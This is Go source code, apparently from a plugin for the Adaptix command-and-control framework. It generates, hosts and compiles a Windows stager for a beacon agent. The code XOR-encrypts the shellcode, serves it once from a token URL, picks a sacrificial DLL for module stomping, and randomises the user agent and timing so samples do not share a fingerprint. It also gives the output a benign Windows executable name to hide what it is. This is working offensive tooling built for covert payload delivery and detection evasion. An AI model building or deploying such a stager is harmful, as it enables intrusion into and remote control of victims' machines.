package main

import (
	crand "crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand/v2"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

// Productized Windows Stager hosting + build (beacon_agent).
//
// publicGroup = Group(Teamserver.endpoint). Default profile endpoint="/api", so
// absolute URL is: https://host:8080/api/s/<token>
//
// Storage: data/stager/<token>.bin (cwd-relative, normally dist/data/stager)
// Policy: one-shot download + 24h TTL + periodic reaper.

const (
	stagerTTL          = 24 * time.Hour
	stagerCleanupEvery = 10 * time.Minute
)

var (
	stagerInitOnce sync.Once
	stagerInitErr  error

	stagerHTTPEndpoint = func() string {
		if v := strings.TrimSpace(os.Getenv("ADAPTIX_ENDPOINT")); v != "" {
			if !strings.HasPrefix(v, "/") {
				v = "/" + v
			}
			return strings.TrimRight(v, "/")
		}
		return "/api"
	}()

	// The /s/:token route lives on the teamserver's own HTTP endpoint, so the
	// stager has to be handed that endpoint's port -- not a listener port.
	// There is deliberately no default here: this used to fall back to 8080,
	// which in a stock profile is an agent listener, and the stager then spoke
	// TLS to a plaintext port, died inside HttpSendRequestA and left no
	// server-side trace whatsoever.  Unset now means "unresolved" (0) and
	// generation fails with an explanation instead of shipping a dead payload.
	stagerTSPort = func() int {
		if v := strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_PORT")); v != "" {
			if n, err := strconv.Atoi(v); err == nil && n > 0 {
				return n
			}
		}
		return 0
	}()

	// The Adaptix web endpoint is TLS whenever the profile carries cert/key,
	// which tls_autogen guarantees, so TLS is the default; an explicit
	// ADAPTIX_TEAMSERVER_SSL=0 selects a plaintext endpoint.
	stagerTSSSL = func() bool {
		switch strings.ToLower(strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_SSL"))) {
		case "0", "false", "no", "off":
			return false
		}
		return true
	}()

	// External address of the teamserver endpoint.  Empty means "reuse the
	// listener's callback address", which is right when the listener and the
	// teamserver are the same host -- the usual case.
	stagerTSHost = strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_HOST"))
)

func stagerDir() string {
	candidates := []string{
		"data/stager",
		filepath.Join("dist", "data", "stager"),
		"/root/AdaptixC2/dist/data/stager",
	}
	for _, c := range candidates {
		if err := os.MkdirAll(c, 0700); err == nil {
			return c
		}
	}
	_ = os.MkdirAll("data/stager", 0700)
	return "data/stager"
}

func stagerBlobPath(token string) string {
	tok := strings.Map(func(r rune) rune {
		if (r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F') {
			return r
		}
		return -1
	}, token)
	if tok == "" {
		return ""
	}
	return filepath.Join(stagerDir(), tok+".bin")
}

func stagerExtractToken(urlPath string) string {
	idx := strings.LastIndex(urlPath, "/s/")
	if idx < 0 {
		p := strings.Trim(urlPath, "/")
		if i := strings.LastIndex(p, "/"); i >= 0 {
			p = p[i+1:]
		}
		return p
	}
	tok := urlPath[idx+3:]
	if i := strings.IndexByte(tok, '/'); i >= 0 {
		tok = tok[:i]
	}
	return strings.TrimSpace(tok)
}

func stagerCleanupExpired() {
	dir := stagerDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	now := time.Now()
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".bin") {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if now.Sub(info.ModTime()) > stagerTTL {
			_ = os.Remove(filepath.Join(dir, e.Name()))
		}
	}
}

func stagerServeHandler(w http.ResponseWriter, r *http.Request) {
	tok := stagerExtractToken(r.URL.Path)
	if tok == "" {
		http.NotFound(w, r)
		return
	}
	p := stagerBlobPath(tok)
	if p == "" {
		http.NotFound(w, r)
		return
	}
	st, err := os.Stat(p)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	if time.Since(st.ModTime()) > stagerTTL {
		_ = os.Remove(p)
		http.NotFound(w, r)
		return
	}
	data, err := os.ReadFile(p)
	if err != nil || len(data) == 0 {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	_, _ = w.Write(data)
	_ = os.Remove(p) // one-shot
}

func stagerInitRoutes() error {
	stagerInitOnce.Do(func() {
		_ = os.MkdirAll(stagerDir(), 0700)
		stagerInitErr = Ts.TsEndpointRegisterPublicRaw("GET", "/s/:token", stagerServeHandler)
		if stagerInitErr != nil {
			stagerInitErr = Ts.TsEndpointRegisterPublicRaw("GET", "/s/*token", stagerServeHandler)
		}
		go func() {
			t := time.NewTicker(stagerCleanupEvery)
			defer t.Stop()
			for range t.C {
				stagerCleanupExpired()
			}
		}()
		stagerCleanupExpired()
	})
	return stagerInitErr
}

func stagerRandomToken(n int) (string, error) {
	b := make([]byte, n)
	if _, err := crand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func stagerRandomKey(n int) ([]byte, error) {
	b := make([]byte, n)
	if _, err := crand.Read(b); err != nil {
		return nil, err
	}
	return b, nil
}

func stagerXor(data, key []byte) []byte {
	out := make([]byte, len(data))
	if len(key) == 0 {
		copy(out, data)
		return out
	}
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}

func stagerKeyCLiteral(key []byte) string {
	parts := make([]string, len(key))
	for i, b := range key {
		parts[i] = fmt.Sprintf("0x%02x", b)
	}
	return strings.Join(parts, ",")
}

var stagerSacrificialDLLs = []string{
	"ole32.dll", "shell32.dll", "crypt32.dll", "dbghelp.dll", "winmm.dll",
}

func stagerPickDLL() string {
	var b [1]byte
	_, _ = crand.Read(b[:])
	return stagerSacrificialDLLs[int(b[0])%len(stagerSacrificialDLLs)]
}

func stagerPublish(token string, blob []byte) (string, error) {
	if err := stagerInitRoutes(); err != nil {
		return "", fmt.Errorf("stager route not ready: %w", err)
	}
	p := stagerBlobPath(token)
	if p == "" {
		return "", fmt.Errorf("invalid stager token")
	}
	if err := os.WriteFile(p, blob, 0600); err != nil {
		return "", fmt.Errorf("write stager blob: %w", err)
	}
	return stagerHTTPEndpoint + "/s/" + token, nil
}

func stagerResolveDownloadTarget(listenerMap map[string]any, cfg GenerateConfig) (host string, port int, useSSL bool, err error) {
	// 取值优先级（三档，与 linux_agent/pl_stager_linux.go 保持**同序**）：
	//   1. agent_params —— 控制台「生成载荷」表单里填的。**主路径**：所有操作员都在
	//      WebUI 上操作，这是唯一一处他们能自己改的地方。
	//   2. 进程环境变量 —— 回退。由 build_deploy.sh --up 按真正加载的 profile 注入，
	//      老部署方式仍能用。
	//   3. 监听器的 callback_addresses —— 只兜底 host（监听器与 teamserver 同机时对）。
	// 全都缺 ⇒ 下面硬报错。绝不再静默回落 8080：那是 agent 监听器。
	port = cfg.StagerTSPort
	if port <= 0 {
		port = stagerTSPort
	}
	useSSL = stagerTSSSL
	if cfg.StagerTSSSL != nil {
		useSSL = *cfg.StagerTSSSL
	}

	host = strings.TrimSpace(cfg.StagerTSHost)
	if host == "" {
		host = stagerTSHost
	}
	if host == "" {
		if lines, ok := listenerMap["callback_addresses"].([]interface{}); ok {
			for _, iLine := range lines {
				line, _ := iLine.(string)
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				h, _, splitErr := net.SplitHostPort(line)
				if splitErr != nil {
					host = line
				} else if h != "" {
					host = h
				}
				break
			}
		}
	}

	// Both of these used to have silent fallbacks ("127.0.0.1" and 8080) that
	// produced a URL pointing at an agent listener.  Say what is missing rather
	// than emitting a payload that can only fail on the target.
	if port <= 0 {
		return "", 0, false, fmt.Errorf(
			"teamserver endpoint port is not configured: fill in the stager download endpoint on the generate form (Stager TS port), or set ADAPTIX_TEAMSERVER_PORT to Teamserver.port from the profile -- the %s route the stager downloads from is served by the teamserver itself, not by the agent listener",
			stagerHTTPEndpoint+"/s/:token")
	}
	if host == "" {
		return "", 0, false, fmt.Errorf("cannot resolve a stager download host: fill in the stager download endpoint on the generate form (Stager TS host), set ADAPTIX_TEAMSERVER_HOST, or give the listener a callback_address")
	}
	return host, port, useSSL, nil
}

// stagerVerifyRoute asks the teamserver's own endpoint for a token that cannot
// exist.  stagerServeHandler answers unknown tokens with 404, so a 404 here
// proves that the port, scheme and endpoint about to be embedded in the stager
// really do reach this plugin's /s/:token route.  Anything else -- the web UI's
// SPA fallback comes back 200, a different service answers differently again --
// is exactly the mismatch that used to ship a stager which died in
// HttpSendRequestA without ever appearing in any log.
//
// The opposite scheme is tried too, on loopback only: if the route answers
// there, the mistake is ADAPTIX_TEAMSERVER_SSL rather than the port, and saying
// so beats reporting a bare connection failure.
//
// Being unreachable is only a warning: the host given to the stager is its
// external address, which the teamserver itself may not be able to dial.
func stagerVerifyRoute(builderId string, host string, port int, useSSL bool) error {
	schemeOf := func(ssl bool) string {
		if ssl {
			return "https"
		}
		return "http"
	}
	urlPath := stagerHTTPEndpoint + "/s/000000000000000000000000"

	client := &http.Client{
		Timeout: 3 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// loopback first, and there both schemes; the advertised host only with the
	// configured scheme, purely as a reachability fallback.
	targets := []struct {
		addr    string
		schemes []bool
	}{
		{net.JoinHostPort("127.0.0.1", strconv.Itoa(port)), []bool{useSSL, !useSSL}},
		{net.JoinHostPort(host, strconv.Itoa(port)), []bool{useSSL}},
	}

	connected := false
	var lastErr error
	var lastStatus string

	for _, target := range targets {
		for i, ssl := range target.schemes {
			url := schemeOf(ssl) + "://" + target.addr + urlPath
			resp, err := client.Get(url)
			if err != nil {
				lastErr = err
				continue
			}
			connected = true
			_, _ = io.Copy(io.Discard, resp.Body)
			_ = resp.Body.Close()

			if resp.StatusCode == http.StatusNotFound {
				if i == 0 {
					return nil
				}
				want := "0"
				if ssl {
					want = "1"
				}
				return fmt.Errorf("the %s route answers over %s but not over the configured %s: set ADAPTIX_TEAMSERVER_SSL=%s", urlPath, schemeOf(ssl), schemeOf(useSSL), want)
			}
			lastStatus = fmt.Sprintf("%s returned HTTP %d", url, resp.StatusCode)
		}
	}

	if !connected {
		_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO,
			fmt.Sprintf("WARNING: could not verify the stager download URL from this host (%v) -- confirm %s://%s:%d%s is reachable from the target", lastErr, schemeOf(useSSL), host, port, urlPath))
		return nil
	}
	return fmt.Errorf("stager download URL does not reach the /s/:token route (%s); check ADAPTIX_TEAMSERVER_PORT and ADAPTIX_ENDPOINT against the Teamserver section of the profile", lastStatus)
}

func stagerFindTemplate(moduleDir string) (string, error) {
	candidates := []string{
		filepath.Join(moduleDir, "templates", "stager_win.c"),
		filepath.Join(moduleDir, "stager_win.c"),
		filepath.Join(moduleDir, "stager_template.c"),
	}
	for _, c := range candidates {
		if st, err := os.Stat(c); err == nil && !st.IsDir() {
			return c, nil
		}
	}
	return "", fmt.Errorf("stager_win.c not found next to agent plugin (looked under %s/templates)", moduleDir)
}

func buildWindowsStager(builderId string, moduleDir string, tempDir string, shellcode []byte, listenerMap map[string]any, arch string, cfg GenerateConfig) ([]byte, string, error) {
	if len(shellcode) == 0 {
		return nil, "", fmt.Errorf("empty shellcode for stager")
	}
	if arch == "x86" {
		return nil, "", fmt.Errorf("Stager currently supports x64 only")
	}

	host, port, useSSL, err := stagerResolveDownloadTarget(listenerMap, cfg)
	if err != nil {
		return nil, "", err
	}
	if err := stagerVerifyRoute(builderId, host, port, useSSL); err != nil {
		return nil, "", err
	}

	key, err := stagerRandomKey(16)
	if err != nil {
		return nil, "", err
	}
	token, err := stagerRandomToken(12)
	if err != nil {
		return nil, "", err
	}
	dll := stagerPickDLL()

	enc := stagerXor(shellcode, key)
	absPath, err := stagerPublish(token, enc)
	if err != nil {
		return nil, "", err
	}

	scheme := "http"
	sslLit := "0"
	if useSSL {
		scheme = "https"
		sslLit = "1"
	}
	fullURL := fmt.Sprintf("%s://%s:%d%s", scheme, host, port, absPath)
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Stager payload hosted: %s", fullURL))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Stager policy: one-shot download, TTL=%s, store=%s", stagerTTL, stagerDir()))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Stager exec: module-stomp primary DLL=%s; inner shellcode=%d bytes", dll, len(shellcode)))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, "NOTE: deliver & run stager before URL is consumed or TTL expires")

	tplPath, err := stagerFindTemplate(moduleDir)
	if err != nil {
		return nil, "", err
	}
	tpl, err := os.ReadFile(tplPath)
	if err != nil {
		return nil, "", err
	}

	// Per-build UA + timing so stager samples don't share one runtime fingerprint.
	uaPool := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
	}
	var rb [2]byte
	_, _ = crand.Read(rb[:])
	ua := uaPool[int(rb[0])%len(uaPool)]
	// Pre-network and post-decrypt jitter bases (ms). Extra 0-399 added in template.
	preMs := 700 + int(rb[1])%900 // 700-1599
	midMs := 400 + int(rb[0])%700 // 400-1099

	src := string(tpl)
	src = strings.ReplaceAll(src, "@@STAGER_HOST@@", host)
	src = strings.ReplaceAll(src, "@@STAGER_PORT@@", strconv.Itoa(port))
	src = strings.ReplaceAll(src, "@@STAGER_PATH@@", absPath)
	src = strings.ReplaceAll(src, "@@STAGER_SSL@@", sslLit)
	src = strings.ReplaceAll(src, "@@STAGER_UA@@", ua)
	src = strings.ReplaceAll(src, "@@STAGER_KEY@@", stagerKeyCLiteral(key))
	src = strings.ReplaceAll(src, "@@STAGER_DLL@@", dll)
	src = strings.ReplaceAll(src, "@@STAGER_PRE_MS@@", strconv.Itoa(preMs))
	src = strings.ReplaceAll(src, "@@STAGER_MID_MS@@", strconv.Itoa(midMs))

	srcPath := filepath.Join(tempDir, "stager_win_gen.c")
	outPath := filepath.Join(tempDir, "stager.exe")
	if err := os.WriteFile(srcPath, []byte(src), 0600); err != nil {
		return nil, "", err
	}

	cc := "x86_64-w64-mingw32-g++"
	args := []string{
		"-Os", "-s", "-mwindows",
		"-fno-exceptions", "-fno-rtti",
		"-o", outPath,
		srcPath,
		"-lkernel32", "-lwininet",
	}
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Compiling Windows stager with %s ...", cc))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Stager runtime profile: pre_ms~%d mid_ms~%d dll=%s (no pe_header_mod on stager)", preMs, midMs, dll))
	if err := Ts.TsAgentBuildExecute(builderId, tempDir, cc, args...); err != nil {
		return nil, "", fmt.Errorf("stager compile failed: %w", err)
	}

	// Do NOT pe_header_mod stager: keep stager PE surface independent of beacon family clustering.

	bin, err := os.ReadFile(outPath)
	if err != nil {
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("Stager ready: %d bytes; payload URL %s", len(bin), fullURL))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("stager-meta token=%s path=%s host=%s:%d ssl=%v dll=%s ttl=%s built_at=%s",
		token, absPath, host, port, useSSL, dll, stagerTTL, time.Now().UTC().Format(time.RFC3339)))

	// 与普通 Exe 同源：文件名取正常的 Windows 可执行名，叫 stager.x64.exe 等于
	// 把工具身份写在下载列表里 —— "stager" 是工具标记、x64 是架构标记，
	// 两个都是真实 Windows 进程名里不会出现的东西。
	return bin, benignExePool[rand.IntN(len(benignExePool))].name + ".exe", nil
}
